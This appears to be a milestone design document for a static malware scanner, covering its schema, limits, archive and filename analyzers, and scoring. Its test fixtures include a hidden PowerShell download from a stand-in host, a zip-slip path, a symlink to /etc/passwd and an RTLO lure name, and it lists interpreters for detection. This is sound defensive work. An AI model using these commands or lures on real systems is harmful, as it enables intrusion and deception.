# M1 · Static analysis engine and reports (fixtures only)

**Status: done.** M1 is delivered as the v0.1.0 preview. The release archives ship `galahad-agent` next to `galahad`, and the user runs the agent inside a VM they already have (see the README quick start). The M1 code does not manage a VM; `galahad scan` with its own VM comes in M2.

## 1. Architecture

### Package layout
```
cmd/galahad-agent/                 main: os.Exit(agent.Run(os.Args[1:], os.Stdout, os.Stderr))
internal/agent/                    flag router for the agent: help, version, analyze (dev-only in M1)
internal/protocol/                 result schema, Rule, Validate(), CleanPath/Snippet. Host-safe: no parsing of untrusted bytes.
internal/analyze/                  engine: walker, File/Output/Analyzer, budget, global limits, evidence helpers
internal/analyze/ident/            Identify(name, data) Kind, Entropy(data). Pure functions.
internal/analyze/static/           registry: All() []analyze.Analyzer. Each analyzer registers in its own file here.
internal/analyze/static/filetype/  EICAR + extension/content mismatch
internal/analyze/static/archive/   zip, tar, gz, bz2 -> children (in memory, never written to disk)
internal/analyze/static/filename/  double extension, bidi, .lnk
internal/analyze/static/signals/   shared secret/network/shell patterns (owned by T1.5, reused by T1.6)
internal/analyze/static/autoexec/  auto-execution inventory and command risk
internal/analyze/static/script/    JS/TS and Python heuristics
internal/analyze/static/deps/      package.json, lockfiles, requirements.txt, pyproject.toml, uv.toml, embedded top-package lists (go:embed)
internal/analyze/static/pdf/       lexical PDF scanner, FlateDecode
internal/analyze/static/office/    OOXML rels/DDE/vbaProject, minimal OLE CFB reader + MS-OVBA decompress (unexported)
internal/analyze/static/binary/    debug/pe, debug/elf, debug/macho
internal/analyze/static/ioc/       IOC extraction from text + IOC rules
internal/analyze/static/eml/       net/mail + mime/multipart -> children, links (x/net/html tokenizer)
internal/defang/                   Defang(url/host/email) and DefangText. Pure, host-safe.
internal/scoring/                  Apply(*protocol.Result): verdict, score, confidence, reasons. Pure, host-safe.
internal/report/                   Write(dir, *Result) -> report.json, summary.md, report.html; Terminal(w, *Result, color)
```
**Host-safety boundary.** The host may import only `protocol`, `scoring`, `report` and `defang`. It never imports `internal/analyze/...`. T1.2 adds a gate check for this: `go list -deps ./cmd/galahad` must not contain `internal/analyze`.

**M2 reuse.** M1 runs this chain in the agent: `analyze.Run` → `scoring.Apply` → `protocol.Validate` → `report.Write`. In M2 the guest agent calls the same `analyze.Run` + `scoring.Apply` and sends the `protocol.Result` JSON over vsock unchanged. The host decodes it with `DisallowUnknownFields`, runs `protocol.Validate`, and calls `report.Write`. M3 can re-run `scoring.Apply` on the host because it works only on validated findings.

### Core types (`internal/protocol`, JSON in snake_case)
```
Severity  string: info | low | medium | high | critical
Verdict   string: clean | suspicious | malicious        (Verdict.ExitCode(): 0/10/20)
Rule      {ID, Severity, Title, Attack}   method Finding(ev ...Evidence) Finding
Evidence  {path, line, snippet}       path: slash-separated, relative to the target; container members use "!/"
                                      (e.g. "lure.eml!/invoice.zip!/invoice.pdf.lnk"); line 0 = no line (binary formats)
Finding   {rule_id, severity, title, attack, analyzer, evidence: []Evidence (>=1, first is primary)}
IOC       {type: url|domain|ip|email, value (raw), path, line}
FileInfo  {path, size, kind, sha256, entropy}
Skip      {path, reason}              reasons: too_large (one file over a size or work limit), budget (a container over its member or byte budget, including a PDF over its object limit or with unread dictionaries or object streams, or a walk that stopped counting files), depth, unsupported, encrypted, parse_error, unreadable (a container member that could not be extracted), timeout, panic
Coverage  {files_seen, files_analyzed, skipped: []Skip, analyzers: []string, truncated bool}
Target    {name, kind: file|dir, size, sha256 (file targets only), file_count}
Result    {schema_version: 1, tool: {name, version}, target, started_at, finished_at,
           files: []FileInfo, findings: []Finding, iocs: []IOC, coverage,
           verdict, score 0-100, confidence 0-100, confidence_level: low|medium|high, reasons: []string}
```
- `Validate()` enforces a fixed set of checks:
  - Rule ID matches `^GAL-[A-Z]+-\d{3}$`.
  - Severity and verdict are from the allowed sets.
  - Attack is empty or matches `^T\d{4}(\.\d{3})?$`.
  - Paths are non-empty, contain no NUL or leading `/`, and are ≤ `MaxPath`.
  - Snippets are ≤ `MaxSnippet` runes.
  - Path, snippet, title and IOC value have no control or bidi characters.
  - Counts stay within the protocol limits.
  - Score and confidence are within 0–100.
- `protocol.CleanPath(raw)` and `protocol.Snippet(raw)` turn control and bidi characters into `\uXXXX` text and truncate. This keeps ANSI escapes and RTLO in untrusted filenames from reaching terminals and reports, and it lets a finding show `invoice‮gpj.exe`.
- JSON keeps raw URLs. Every human-facing renderer (md, html, terminal) defangs them.
- Findings are sorted by severity (descending), then path, line and rule. This keeps output deterministic.

### Analyzer interface and dispatch (`internal/analyze`)
```
File     {Path (clean, for evidence), Name (raw base name), Kind ident.Kind, Data []byte, Depth int}
Output   {Findings []protocol.Finding, IOCs []protocol.IOC, Children []File, Skips []protocol.Skip}
Analyzer interface { Name() string; Analyze(ctx context.Context, f File) (Output, error) }
            // Returns an empty Output quickly for files it does not handle.
Run(ctx, path string, analyzers []Analyzer) (protocol.Result, error)
EvidenceAt(f File, byteOffset int) protocol.Evidence   // path, 1-based line, cleaned line snippet
```
**How the engine walks the target.** Each file is read once.
1. The engine opens the target with `os.OpenRoot` and walks it with `WalkDir`.
2. Only regular files are read. Symlinks are never followed (the target path is recorded; a link that leaves the root becomes a coverage skip). FIFOs and devices are skipped.
3. Each file is read up to `MaxFileSize` into `Data`, charged to the job budget.
4. The engine fills `Kind`, `sha256` and entropy into `FileInfo`.
5. It calls every registered analyzer in name order. Each call gets a per-file timeout context and runs inside a `recover()` wrapper: a panic or error becomes a `Skip` and the file counts as not analyzed.
6. The engine stamps `Finding.Analyzer`.
7. Children go on a FIFO queue with `Path = parent.Path + "!/" + CleanPath(member)` and `Depth+1`, and they get the same dispatch.

**Remaining job budget.** The engine puts the bytes of the job budget that are left on the context of every analyzer call. `analyze.WithBudget(ctx, n)` sets it (a negative `n` counts as zero) and `analyze.Budget(ctx) (int64, bool)` reads it; the bool is false when the context carries none. An analyzer takes the smaller of its own cap and the budget: the archive expansion allowance, the OOXML package budget (office) and the decoded bytes of a message (eml). PDF decoding keeps its own caps, because it is not charged to the job budget. An archive that runs out of the job budget gets a Skip `budget` and no `GAL-ARCHIVE-003` finding, because the budget says nothing about the archive itself.

**Auto-run files past the limits.** An analyzer that implements `analyze.Priority` (`Priority(path string) bool`) names files it must always see. The autoexec analyzer does, from the same path matcher it routes files with (`.vscode/tasks.json`, `package.json`, `devcontainer.json`, `.husky/*`, `setup.py`, `pyproject.toml`, `.npmrc` and the rest of its list). A file like that is still analyzed when it comes after `MaxFiles` or when the job byte budget is spent, provided it is at most `MaxFileSize`. These extra files draw on their own allowance of `MaxExtraFiles` (2 000) files and `MaxExtraBytes` (64 MiB), do not charge the job budget, and count in `files_seen` and `files_analyzed`. Without this rule, padding a repository past 20 000 files or 1 GiB would hide `.vscode/tasks.json` and leave the verdict CLEAN. The allowance is checked before a file is read. When it runs out, one Skip `budget` is recorded for the first refused file, and a file over `MaxFileSize` or over what is left of the allowance gets its own Skip `budget`. The same Skip is recorded when the walk reaches the counting limit (10 × `MaxFiles`), named after the file it stopped at, and once for the first archive member dropped because the walk reached the counting limit. An archive member past `MaxFiles` is analyzed from the same allowance when an analyzer asks for it, matched by its path inside its container (`File.Member`, set by the engine, never cut at a `!/` that a directory name may hold), and otherwise only counted, so the verdict does not depend on where an archive falls in the walk. All of them turn CLEAN into SUSPICIOUS through the unanalyzed-input rule. Files that only list automation (Makefile, `build.rs`, CI workflows) are not asked for, since a large tree has thousands of them. An auto-run file over `MaxConfigSize` gets a Skip `budget` from autoexec for the same reason, unless it sits in a tool directory (`node_modules/.bin`, `.venv/bin`, `venv/Scripts`) and parses as an ELF, PE or Mach-O file with `debug/elf`, `debug/pe` or `debug/macho` (a copied interpreter or native tool), which keeps `too_large`. Leading magic bytes are not enough, because a shell skips a first line it cannot run, and husky hooks are never exempt. The engine gives every unread priority file a `budget` skip. A benign repository that is only truncated stays CLEAN with halved confidence.

Directory walking stays sequential (deterministic and simple). Hashing and identification use the full data. A file larger than `MaxFileSize` is still hashed by streaming, but it is skipped for analysis.

**Registration.** `internal/analyze/static/static.go` has `var analyzers []analyze.Analyzer` and `All()`, which returns a copy sorted by name. Each analyzer task adds its own file `internal/analyze/static/<name>.go` containing `func init(){ analyzers = append(analyzers, <pkg>.New()) }`. Because each task adds a new file, parallel branches do not conflict.

**Kinds** (`ident`): text, pdf, zip, ooxml (zip with `[Content_Types].xml`), gzip, bzip2, tar, ole, pe, elf, macho, lnk, unknown. The archive analyzer leaves `ooxml` to office.

### Global limits (constants)
`internal/analyze/limits.go`, for input:

| Constant | Value |
|---|---|
| MaxFileSize (bytes given to analyzers) | 32 MiB |
| MaxTotalBytes (read + unpacked per job) | 1 GiB |
| MaxFiles (incl. members; counting continues to 10× then `truncated` and a Skip `budget`; only auto-run files are still analyzed) | 20 000 |
| MaxExtraFiles (auto-run files analyzed past MaxFiles or MaxTotalBytes) | 2 000 |
| MaxExtraBytes (their size, outside the job budget) | 64 MiB |
| MaxNesting (container depth) | 6 |
| MaxDirDepth | 64 |
| MaxLineScan (bytes per line scanned by line heuristics) | 1 MiB |
| PerFileTimeout (cooperative ctx) | 10 s |
| DefaultJobTimeout (`-timeout` flag) | 5 min |
| MaxConfigSize (JSON/JSONC/YAML-ish config files) | 1 MiB |

`internal/protocol`, for output and validation:

| Constant | Value |
|---|---|
| MaxFindings (then `coverage.truncated`; a more severe finding replaces the newest of the lowest severity among findings whose rule occurs more than once, so the only finding of a rule stays) | 2 000 |
| MaxFindingsPerRulePerFile | 20 |
| MaxIOCs (dedup by type+value) | 1 000 |
| MaxSnippet | 200 runes |
| MaxPath | 1 024 bytes |

**Memory limit (agent).** `galahad-agent analyze` sets a soft memory limit with `debug.SetMemoryLimit` before it reads the target. The default is 75% of the physical memory, at most 4 GiB, and 2 GiB when the memory cannot be read (`MemTotal` in `/proc/meminfo` on Linux, `sysctl hw.memsize` on macOS, `GlobalMemoryStatusEx` on Windows). A set `GOMEMLIMIT` environment variable is left alone. `--memory-limit <size>` (bytes, with an optional `KiB`, `MiB` or `GiB` suffix) overrides both. `agent.MemoryLimit(ram, gomemlimit, flag)` is the pure computation.

Format-specific limits are constants in the analyzer's own package:
- archive: 10 000 entries, ratio 100:1, 256 MiB per archive
- pdf: 100 000 objects, 1 048 576 tokens per region, 16 MiB per decoded stream, 64 MiB per file; hitting the object limit, or the token limit in a dictionary, trailer or object stream, or a cut or undecodable object stream, sets a Skip `budget` (syntax that could hold an action was left unread); the token limit in plain page content sets `too_large`
- ole: chain length ≤ sector count, so cycles are caught
- eml: 64 KiB headers, 200 parts, MIME depth 10

### T1.3 · Archive unpacking (zip/tar/gz/bz2) with limits
- **Goal:** Expand archives in memory into child files, enforcing bomb, depth, count and path limits and never writing members to disk.
- **Files:**
  - `internal/analyze/static/archive/`
  - `internal/analyze/static/archive.go`
  - `test/acceptance/fixtures_test.go`: `zipDir`, `zipEntries` (raw names), `tarGz` builders, used later by T1.4, T1.9 and T1.15
- **Acceptance criteria:**
  - zip, tar, tar.gz/tgz, .gz and .bz2 produce children with `!/` paths.
  - ooxml packages are expanded only for members the office analyzer does not read. Package markup (`[Content_Types].xml`, `.xml` below the standard folders, `.rels` anywhere) and `vbaProject.bin` are left alone only while their bytes fit their name (text, and OLE for the project). A part that holds a zip, an executable or binary data is unpacked as a child.
  - Entry names with `..`, a leading `/`, a drive letter, a UNC path or backslash traversal produce a finding, and that member is skipped.
  - A backslash in a member name is a path separator, as Windows extractors treat it. The engine builds the child path with `/`, so every path rule sees `a/.vscode/tasks.json`; the raw name stays in `GAL-ARCHIVE-005`.
  - A PE, ELF or Mach-O file with a zip appended (an end of central directory record in its last 64 KiB + 22 bytes) is also unpacked, and the binary analyzer still runs on the file itself.
  - An archive found at container depth `MaxNesting` or deeper is not decompressed. It becomes a Skip `depth`.
  - A zip entry whose local header name differs from its central directory name is analyzed under both names. The local header is found through the offset in the entry's central directory record, never by scanning, so a decoy header inside an extra field cannot stand in for it. A zip whose records cannot be matched to local headers is reported the same way.
  - Symlink and hardlink entries are reported and never resolved.
  - Actual bytes read are capped per entry (`MaxFileSize`), per archive (256 MiB) and by ratio (100:1). Header sizes are not trusted.
  - Encrypted zip entries become a finding plus a Skip `encrypted`.
  - More than 10 000 entries sets a Skip `budget`.
  - 7z, rar and iso become a Skip `unsupported`.
- **Rules:**
  - `GAL-ARCHIVE-001` high: entry path escapes the archive (zip-slip)
  - `GAL-ARCHIVE-002` medium: link entry in archive
  - `GAL-ARCHIVE-003` high: decompression bomb
  - `GAL-ARCHIVE-004` medium: encrypted entries could not be inspected (T1027.013)
  - `GAL-ARCHIVE-005` low: entry name uses backslash separators. Reported once per archive, for the first name, with the count in the snippet, so a zip of thousands of such names cannot fill the findings cap. Low, not medium: the member is analyzed under its `/` name, so the evasion is already closed. Some old Windows tools do write backslashes, so one alone must not make a benign zip suspicious.
  - `GAL-ARCHIVE-006` low: executable with an appended zip archive. Explains why members appear under an executable. Self-extracting installers are common, so it is a hint only.
  - `GAL-ARCHIVE-007` medium: zip entry names disagree between the local header and the central directory. No legitimate writer does this. Reported once per archive like `-005`.
- **Problems:** P5, P6 (containers), P7.
- **QA** (fixtures built at test time):
  - `archive-zipslip` (`../../evil.sh`): exit 10, `GAL-ARCHIVE-001`, and nothing written outside the `-o` dir (the parent of the temp dir is unchanged)
  - `archive-bomb` (200 MiB of zeros, zipped): exit 10, `GAL-ARCHIVE-003`, finishes in < 30 s
  - `archive-symlink` (tar with `link -> /etc/passwd`): exit 10, `GAL-ARCHIVE-002`
  - `benign-archive` (zip of `benign-go-cli`): exit 0, and finding-free children listed in `files` as `benign.zip!/main.go`
- **Depends on:** T1.2.
- **Size:** M.

### T1.4 · Filename tricks: double extension, RTL override, `.lnk`
- **Goal:** Flag deceptive file names and shortcut files, including inside archives and email attachments.
- **Files:** `internal/analyze/static/filename/`, `internal/analyze/static/filename.go`.
- **Acceptance criteria:**
  - Detects a decoy extension (pdf, doc(x), xls(x), jpg, png, txt, zip and similar) followed by an executable extension (exe, scr, com, pif, bat, cmd, lnk, js, jse, vbs, vbe, wsf, hta, ps1, msi), including whitespace padding before the last dot.
  - Detects any bidi control character (U+200E/F, U+202A–U+202E, U+2066–U+2069) in the raw name.
  - Detects `.lnk` by extension or LNK magic.
  - For LNK files, scans UTF-16LE and ASCII strings (bounded to 64 KiB) for interpreters (powershell, cmd, mshta, wscript, cscript, rundll32, regsvr32) or URLs.
  - `archive.tar.gz` and `report.final.pdf` are not flagged.
- **Rules:**
  - `GAL-NAME-001` critical: decoy double extension ending in an executable type (T1036.007)
  - `GAL-NAME-002` critical: bidi control character in the filename (T1036.002)
  - `GAL-NAME-003` medium: Windows shortcut or script-host file (lnk, url, scf, hta, wsf, vbe, jse) (T1204.002)
  - `GAL-LNK-001` high: shortcut launches a script interpreter or URL (T1059)
- **Problems:** P5.
- **QA:**
  - `p5-lnk-in-zip` (built: `invoice.zip` containing an LNK generated at test time with the target `powershell.exe -w hidden -c iwr hxxp://sinkhole.test/p`): exit 20, `GAL-NAME-001` at `invoice.zip!/invoice.pdf.lnk`
  - `p5-rtlo-name` (built: `invoice‮fdp.exe` with harmless bytes): exit 20, `GAL-NAME-002`, evidence path contains the literal `‮`
  - benign twin: `benign-archive`, exit 0
- **Depends on:** T1.2. The QA test uses `zipEntries` from T1.3.

### T1.5 · Auto-execution inventory

## 4. Scoring model (T1.13)

**Weights.** Each rule ID counts once, at its highest severity seen:

| Severity | Weight | Meaning |
|---|---|---|
| info | 0 | inventory only |
| low | 5 | three needed to reach suspicious |
| medium | 15 | suspicious on its own |
| high | 35 | suspicious on its own; two different highs are malicious |
| critical | 100 | malicious on its own |

`score = min(100, Σ weights)`.

**Hard triggers.** Any critical finding forces MALICIOUS. Scoring keeps no rule-ID list, so new critical rules are hard triggers automatically.

**Verdict:**
1. Any critical → MALICIOUS.
2. Score ≥ 70 → MALICIOUS.
3. Score ≥ 15 → SUSPICIOUS.
4. Otherwise CLEAN.
5. Coverage guard: if the verdict is CLEAN and coverage < 0.5 → SUSPICIOUS ("less than half of the files could be analyzed").
6. Unanalyzed input: if the verdict is still CLEAN and any skip has the reason `depth`, `encrypted`, `budget`, `timeout` or `panic`, or `unreadable` (a container member that could not be extracted) → SUSPICIOUS ("part of the input could not be analyzed"). `budget` here is a container with more members or bytes than its budget (archive, office, eml, a PDF with more objects or dictionary and object-stream tokens than its limits, or an object stream it could not read, or the job budget while unpacking members), a walk that stopped counting files at 10 × `MaxFiles`, or auto-run files refused for want of the extra allowance, so a payload could sit in what was not read. `too_large` does not trigger this rule: a file over a size or work limit (a data file, a media file, a model, a pack file, a huge `document.xml`, or a top-level file that does not fit the job budget) is normal in benign input, so it only lowers coverage and confidence. `unsupported` and `parse_error` do not trigger it either, at the top level or in a container; they stay covered by the coverage guard only. A `timeout` also covers a job that runs out of time: one Skip `timeout` is recorded at the file or member where the job stopped, and findings an analyzer made before its own timeout are kept.
7. A CLEAN verdict with `coverage.truncated` stays CLEAN, but its confidence is halved and a reason says that a limit cut the analysis short. Flipping it would turn every repository over the file or byte limit suspicious.

**Confidence (0–100):**
- `c = files_analyzed / files_seen` (0 if nothing was seen). A file counts as analyzed when it was read fully and no analyzer returned an error, panic, timeout or Skip for it. A member that an analyzer skips with the reason `depth`, `budget`, `encrypted` or `too_large` counts as seen and not analyzed, so it lowers `c`.
- Agreement means at least 2 distinct analyzers produced findings of medium or higher.

| Verdict reached by | Confidence |
|---|---|
| Hard trigger | 100 with agreement, else 90 (coverage ignored) |
| Score (MALICIOUS or SUSPICIOUS) | `round(100 × c × a)`, a = 1.0 with agreement, else 0.75 |
| CLEAN | `round(100 × c × a)`, a = 1.0 with no low+ findings, else 0.9 |

Levels: high ≥ 80, medium ≥ 50, low < 50.

**Reasons.** One line per decision, for example `hard trigger GAL-EXFIL-001 (critical) at scripts/setup.js:3`, `score 85 >= 70`, `coverage 40% < 50%`, `agreement: autoexec, script`.

## Deliberately left out of M1
- **Engine and protocol:** no progress streaming (one Result document, which M2 frames over vsock); no parallel per-file analysis; cooperative timeouts only (the VM kill is the backstop in M2); no `-json` stdout mode; no per-finding `detail` field; sha256 only.
- **Rule data:** rules are Go tables (no `rules/` JSON); only the top-package lists are embedded data. No YARA or ClamAV (M2 guest tools).
- **Analyzers:** JS and Python only, lexical (no AST); `.sh` analyzed only in autoexec contexts; no cross-file correlation beyond adding scores; no pnpm-lock, Pipfile, Cargo or go.mod dependency checks, and pyproject only for dependency strings, uv and Poetry sources and indexes; PDF FlateDecode only, no JS deobfuscation or XFA; Office without RTF, XLM macros, VBA p-code or embedded objects; LNK string scan only; no `.msg`/TNEF; no 7z, rar or iso; `.git/hooks`, `launch.json` and `.idea` run configs not inventoried.
- **Delivery:** ~~the agent is not shipped in releases in M1.~~ Superseded for v0.1.0: the agent is shipped in the release archives as a preview, to be run inside a VM the user already has.

### Known false alarm
A repo whose only automation is a harmless devcontainer lifecycle command or npm install script, such as `"postCreateCommand": "npm ci"` or `"postinstall": "node-gyp rebuild"`, comes out SUSPICIOUS (exit 10). One medium `GAL-AUTOEXEC-004` or `GAL-AUTOEXEC-005` is enough to reach the suspicious threshold.

This is deliberate. A static check cannot tell a harmless install command from one that runs attacker code. A trial allowlist of common commands was reviewed and dropped, because each allowed command can still run attacker code:
- through the repo's own `prepare` script;
- through behavior-changing flags (`--prefix`, `--script-shell`, `--userconfig`);
- through `pip -r` files the deps check does not read;
- through prisma generators or `binding.gyp` actions;
- through a repo `.npmrc`, `.yarnrc.yml`, `.pnpmfile.cjs` or pyproject index settings;
- through devcontainer `containerEnv`, `remoteEnv` or `workspaceFolder`.

M4 revisits this: dynamic analysis can run the install in the guest and report what it actually did.

Most of those routes are now reported on their own, with or without an install command: `.npmrc`, `.yarnrc` and `.yarnrc.yml` (`GAL-AUTOEXEC-013`, `-014`), `.pnpmfile.cjs` (`-015`), prisma generator providers (`-016`), `binding.gyp` expansions and actions (`-017`, `-018`), pyproject and `uv.toml` index and source settings (`GAL-DEPS-002`, `-004`) and `pip -r` files that look like requirements files (`GAL-DEPS-*`). A repo that uses one of them is SUSPICIOUS even when its install command is harmless.

Still not reported:
- the contents of a committed Yarn release or plugin (listed at low only), and the commands inside a `binding.gyp` `actions` list;
- `-r` or `-c` files that are not `.txt`, or whose content does not look like a requirements file;
- the devcontainer routes in the list above.
